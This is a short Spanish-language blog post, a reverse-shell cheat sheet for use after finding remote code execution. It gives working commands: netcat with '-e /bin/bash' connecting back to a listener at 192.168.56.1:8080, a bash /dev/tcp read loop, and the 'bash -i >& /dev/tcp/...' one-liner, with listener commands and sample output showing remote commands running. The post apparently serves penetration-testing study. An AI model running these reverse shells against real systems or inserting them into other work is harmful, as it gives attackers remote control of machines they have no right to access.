---
layout: post
title:  Reverse shells
excerpt: Reverse shell cheat sheet
bigimg: '/img/reverse-shell.png'
tags: [shell, netcat, security]
---
Situación: encontrado un método de RCE pero sin posibilidad de acceso a la shell. Solución: _bind_ de la shell a un puerto TCP.

## netcat

Esto ya lo vimos hace tiempo en este [articulo]. Lo que ocurre es que:

* nc/netcat no siempre estará disponible
* si lo está, es posible que no tenga la opción `-e`

En ese caso, puedo ponerme a escuchar (en un puerto accesible al sistema de destino):

```shell
nc -l 8080
```

Y en destino:

```shell
nc 192.168.56.1 8080 -e /bin/bash
```
Ya podemos ejecutar comandos en el sistema remoto cómodamente sentados frente a nuestra máquina:

```shell
user@mihost:~$ nc -l 8080
hostname
vmjessie
```

La máquina objeto de la ejecución de la shell inicia una conexión hacia el puerto de escucha (8080 en el ejemplo). Por eso es necesario elegir un puerto accesible, no filtrado; una elección segura serían los puertos 80 o 443.

## bash

En este caso no vamos a usar `nc` en el equipo objetivo, sino un descriptor asociado a un socket donde vamos a enviar las salidas de la shell. Partimos de nuestro equipo (en el ejemplo, nuestra IP es 192.168.56.1), donde estamos escuchando (con `nc` o lo que sea, da igual) en un puerto accesible:

```shell
nc -vvv -l 8080
```

Y en el objetivo:

```shell
exec 5<>/dev/tcp/192.168.56.1/8080
cat <&5 | while read line; do $line 2>&5 >&5; done
```

Con esto, los comandos que tecleemos en nuestra máquina son ejecutados en la remota y la salida nos llega a nosotros:

```shell
user@192.168.56.1:~$ nc -vvv -l 8080  
hostname
target
```

Mediante esta otra sintaxis:

```shell
user@target:~$ bash -i >& /dev/tcp/192.168.56.1/8080 0>&1
```

tenemos igualmente la consola en nuestra máquina, prompt incluido:

```shell
user@192.168.56.1:~$ nc -vvv -l 8080  
user@target:~$ hostname
hostname
target
```

Si hay alguna razón para ejecutar la shell vía algún lenguaje de scripting (PHP, Perl, Python, Java, Ruby... ¡¡Gawk!!) [aquí] hay un montón de pruebas de concepto para entretenerse un rato.

[articulo]:/2015-06-08-netcat-primer
[aquí]:https://highon.coffee/blog/reverse-shell-cheat-sheet/
